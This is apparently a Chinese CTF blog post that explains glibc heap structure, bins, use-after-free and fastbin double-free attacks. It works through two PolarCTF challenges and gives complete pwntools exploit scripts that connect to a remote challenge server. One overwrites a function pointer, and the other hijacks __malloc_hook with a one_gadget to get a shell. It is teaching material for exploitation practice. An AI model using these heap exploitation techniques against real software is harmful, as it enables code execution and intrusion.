---
layout: post
title: 'Heap(堆)基础知识与UAF及Fastbin attck'
date: "2026-02-27T00:57:23Z"
---
Heap(堆)基础知识与UAF及Fastbin attck
=============================

新年新开始，heap我来啦！

堆的介绍
----

堆是一种动态内存分配的区域，区别于栈

*   栈是自动编译器自动分配和释放的，堆是程序员自行分配和释放的（一般没释放在程序结束系统也会自动释放）
*   栈是由高到低增长的并且不可分割，增长方式是通过rsp的移动，而堆是由低到高并是可分隔的，并且除了释放后的合并之外不会自行增长，分配方式是通过malloc，realloc，calloc等c语言函数进行分配，释放方式就是通过free函数释放。
*   栈的生命随着一个函数的结束而结束，堆则是从开始分配一直到主动释放后程序结束才结束，所以堆就可以多线程共享

一般在第一次申请堆内存后，除了分配用户所需的内存之外，还会分配一份较大的内存称为top chunk，比如malloc(0x10)这时候在64位下实际堆块大小是0x20，因为除了用户需要的0x10之外还要有0x10大小给堆的头用于控制，并且堆的大小64位下为0x10的整数倍，32位下为0x8的整数倍，64位下如果小于则会先将大小+8并进行16字节对齐后再分配（如果是比如malloc(1)那就返回0x10大小可写，实际大小是0x20）。

堆在释放后如果有tcache机制会直接放入tcache中，如果没有则先看释放能合并，不能合并且tcache已满（或没tcache机制）就先根据大小，放入fastbin或unsortedbin，在unsortedbin中的堆之后再根据大小放入smallbin，largebin。（bin在英语就是垃圾箱的意思，当然也可以文雅一点翻译成回收站）

### 使用中的堆结构如下：

*   第一个pre\_size/user data就是如果前（内存的前，也就是物理相邻）一个堆块没有被释放就储存前一个堆块的数据，如果被释放了就储存前一个堆块的大小
*   第二个size位表示当前堆块的大小（64位下大小至少为0x10，32为下至少为0x8）后面的NMP就是size位的末三个二进制位（因为最小的0x8的二进制是1 0 0 0）
*   N位是NON\_MAIN\_ARENA意思是是否不属于主线程，0代表属于主线程，1代表不属于主线程（实际大小是4即1 0 0)
*   M位是IS\_MMAPPED意思是该堆是否由mmap分配，0代表不是，1代表是（实际大小是2即1 0）
*   P位是PREV\_INUSE意思是前一个堆是否处于使用状态，0代表不是，1代表是（实际大小就是1）
*   后面user\_data是用户实际可写的地方，malloc函数的返回值的指针就指向这
*   再下面的pre\_size/user data是下一个堆块的头

### 释放后的堆结构如下：

除了有使用中的堆的结构之外，还有的结构是fd和bk，fd指针指向下一个堆块的pre\_size/user data，bk指向前（链表的前，也就是逻辑相邻）一个堆块的pre\_size/user data，在tcache及fastbin中bk指针不发挥作用，在其余bin中发挥作用。

### 堆分配机制：

1.  首先从tcache，fastbin等找是否有符合大小的堆如果没有就合并堆块后再找一次
2.  在top chunk中分割
3.  向内存中申请

### 各bin的介绍：

*   tcache：在libc-2.26后加入了tcache机制，tcache机制简单来说就是，释放后的堆块先进入tcache，当tcache满后（7个）再看能否合并，不能则根据大小放入fastbin，smallbin，largebin，unsortedbin中，在tcache中的堆采用lifo机制并是单向链表且p位恒为1（不进行合并）。
*   fastbin：大小在64位下为0x20-0x80（其最大大小储存在golbal\_max\_fast这个全局变量内），32位除以2就可以了，fastbin与tcache相同，采用lifo机制并是单向链表且p位恒为1（不进行合并），但fastbin的链表在64位下是以0x20为首项，公差为0x10的等差数列，即0x20大小一条链，0x30大小一条链...一直到0x80，但如果fastbin大量存在也会进行合并。
*   smallbin：大小在64位下为0x20-0x400，32位就除以2，smallbin采用双向链表及FIFO机制，一般大小在0x20-0x80的堆块会是由fastbin合并后进入smallbin的，大小在0x80-0x400的堆块会先进入unsortedbin，再进入smallbin。smallbin的p位并不恒为1，都有可能，但只有物理相邻的堆块才会合并。
*   largebin：大小在64位大于0x400，32位就除以2，largebin也是双向链表但不是fifo机制，其中的堆块由小到大排列，同样堆块是从unsortedbin中来的，要注意的是在largebin中的堆块出了上述堆结构之外还有fd\_nextsize指针（指向下一个不同大小的堆）及bk\_nextsize（指向上一个不同大小的堆）。
*   unsortedbin：除了进入tcache及fastbin的堆块都会先放入unsortedbin，并且也是双向链表及FIFO机制。unsortedbin的头结点储存在main\_arena的bins数组的条目中，当仅有一个堆块时其fd和bk指针会指向该头节点，如果能打印出这两个指针就可以计算main\_arena进而计算libc基地址。

UAF介绍
-----

UAF就是use after free的意思，简单来说就是能对时候后的堆块进行操作，常见于free后未把指针置空，因为单纯的free不会清空堆内的内容，这时虽然堆块释放了，我们还是可以通过malloc相同大小的堆把他申请回来（如果没合并的话），原理就这么简单。下面我们看例题

### Polarctf-like\_it

这个题挺经典的，挺多入门题都长这样，我们一个个函数看，第一个是def函数  

简单来说就是要我们写入一串字符串，先按，分隔再按.分隔，分隔后如果有everyone就返回，如果没有everyone并且如果我们在调试就exit，如果没调试也没事。接下来是menu函数，这个就是菜单，我们继续往下。当我们输入2时就会进这个del\_note函数  

简单来说就是输入一个索引然后free掉两个堆，但这里没有把free后的指针置空，这就有UAF漏洞了，我们接下去看，当我们输3就有print\_note这个函数  

这个函数把\*（&notelist+count）当成函数来用了，相当于我们只要控制了里面的值就控制了一个函数指针，可以调用任意函数，接下去看，当我们输入4是退出，当我们输入1就是加一个堆块  

这里看起来比较复杂，首先就先检测count，如果大于5就直接返回，小于5就先检测notelist+n4有没有值，先在notelist+n4的地方申请一个0x10堆块，然后往这个堆块前0x8里写一段puts函数后0x8写上我们自己设置大小和内容的堆块，然后count+1并返回，大概就是这个图所示  

到这这题就很简单了，我们知道0x10是fastbin范围的，我们只需要申请两个远离0x10大小堆块，然后释放掉，再申请一个0x10大小的堆块就可以起到如下效果  

这样我们就可以在堆里覆盖掉这个puts函数，还记得之前的函数指针是\*(&notelist+count)吗，我们把这个值写成后门函数就getshell了，exp如下：

    from pwn import *
    import sys
    from ctypes import *
    from ae64 import AE64
    from pymao import *
    context.log_level='debug'
    context.arch='i386'
    elf=ELF('./pwn')
    flag =1
    if flag:
        p = remote('1.95.36.136',2141)
    else:
        p = process('./pwn')
    sa = lambda s,n : p.sendafter(s,n)
    sla = lambda s,n : p.sendlineafter(s,n)
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    rcl = lambda : p.recvline()
    leak = lambda name,addr :log.success(name+"--->"+hex(addr))
    u6 = lambda a : u64(rc(a).ljust(8,b'\x00').strip())
    i6 = lambda a : int(a,16)
    def csu():
        pay=p64(0)+p64(0)+p64(1)
        return pay
    def ph(s):
        print(hex(s))
    def dbg():
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(p)#maybe gdbscript='set debug-file-directory ./star'
        pause()
    def add(s,a):
        ru(b":")
        sl(b'1')
        ru(b"Note size :")
        sd(str(s))
        ru(b"Content :")
        sd(a)
    def pr(s):
        ru(b"Your choice :")
        sl(b'3')
        sd(str(s))
    def free(s):
        ru(b"Your choice :")
        sl(b'2')
        ru(b"Index :")
        sd(str(s))
    back=0x400CB1
    sd(b'every.,')
    add(0x60,b'b'*3)
    add(0x60,b'b'*3)
    free(0)
    free(1)
    add(0x10,p64(back)*2)
    pr(0)
    ti()
    

Fastbin attack
--------------

顾名思义，主要就是利用fastbin中的堆块，所以大小在64位下为0x20-0x80（其最大大小储存在golbal\_max\_fast这个全局变量内），32位就除以2。主要手法就是double free。double free就是进行两次free操作，但一般libc会有保护，比如有一个堆块a，直接free两次会报错，所以一般就是free一次堆块a，free一次堆块b，再free一次堆块a。这样的效果在fastbin中就是  
fastbin的头--->a--->b--->a(实际上就是b指回上一个a，并没有两个a堆块在fastbin中）  
这时假如有uaf漏洞，修改了a的fd指针，那在fastbin中就变成了这样  
fastbin的头-->a--->b---->a--->a的fd指针指向的位置。  
这样就相当于把a的fd指针指向的位置当成了一个堆，一般至少会有区分这个地方是不是堆的保护，只需要控制malloc的大小就可以了，只有目标区域有一个0x80以下的数据就只需要控制申请堆的大小-0x10等于这个数据大小即可（比如数据是0x8f，就申请0x70即可，因为末尾不计入大小），这时就可以实现一个任意地址写，如果没有保护，就可以往malloc\_hook函数（如果有）写入one\_gadget这样在下次进行malloc的时候直接getshell，也可以往栈上写内容等。具体操作就是确保要写的目的地址有size位，并控制a，b及后续申请的堆块大小（实际大小）等于那个size位（确保在同一条链上）free一次堆块a，free一次堆块b，再free一次堆块a，申请一次堆块，这时假如free后没有置空，那就可以修改fd指针，然后再申请两次堆块（第一次取出的是堆块b，第二次取出的还是堆块a），最后再申请一次堆块就可以往我们想写的地方写了。接下来我们看例题

### Polarctf-来堆签个到

这题没剔除符号，就不像之前一样分析了，每个函数像题目名字一样的功能，这个num就是输入一个字符串然后转换成数字，这题跟上题一样free没有置空指针，存在UAF，不同的就是没有了后门函数和非常明显的函数指针，但这题是2.23版本的题，所以他还有\_\_malloc \_hook函数，所以我们先申请一个足够大的堆，然后free让他进入unsortedbin中，在show把libc基地址打印出来，接下来fastbin attack劫持malloc hook为onegadget即可getshell，exp如下：

    from pwn import *
    import sys
    from ctypes import *
    from ae64 import AE64
    from pymao import *
    context.log_level='debug'
    context.arch='amd64'
    elf=ELF('./pwn')
    libc = ELF('./libc.so.6')
    libc1=cdll.LoadLibrary('./libc.so.6')
    li='./libc.so.6'
    flag = 1
    if flag:
        p = remote('1.95.36.136',2071)
    else:
        p = process('./pwn')
        # context.terminal = ['tmux', 'splitw', '-h']
    sa = lambda s,n : p.sendafter(s,n)
    sla = lambda s,n : p.sendlineafter(s,n)
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    sdr= lambda s : p.send(str(s))
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    rcl = lambda : p.recvline()
    leak = lambda name,addr :log.success(name+"--->"+hex(addr))
    u6 = lambda a : u64(rc(a).ljust(8,b'\x00').strip())
    i6 = lambda a : int(a,16)
    def csu():
        pay=p64(0)+p64(0)+p64(1)
        return pay
    def ph(s):
        print(hex(s))
    def dbg():
        gdb.attach(p)#maybe gdbscript='set debug-file-directory ./star'
        pause()
    def add(s,a):
        ru(b"choice:")
        sdr(1)
        ru(b"index:")
        sdr(s)
        ru("size:")
        sdr(a)
    def free(s):
        ru(b"choice:")
        sdr(2)
        ru(b"index:")
        sdr(s)
    def edit(a,b,c):
        ru(b"choice:")
        sdr(3)
        ru(b"index:")
        sdr(a)
        ru(b"length:")
        sdr(b)
        ru("content:")
        sd(c)
    def pr(a):
        ru(b"choice:")
        sdr(4)
        ru(b"index:\n")
        sdr(a)
    add(0,0x300)
    add(1,0x20)
    free(0)
    pr(0)
    libcbase=u6(6)-0x3c4b78
    ph(libcbase)
    mh=libcbase+libc.sym['__malloc_hook']-0x23
    ogg=libcbase+0xf03a4
    add(2,0x60)
    add(3,0x60)
    free(2)
    free(3)
    free(2)
    add(4,0x60)
    edit(4,0x20,p64(mh))
    add(5,0x60)
    add(6,0x60)
    add(7,0x60)
    edit(7,0x50,b'\x00'*0x13+p64(ogg))
    add(8,0x114514)
    ti()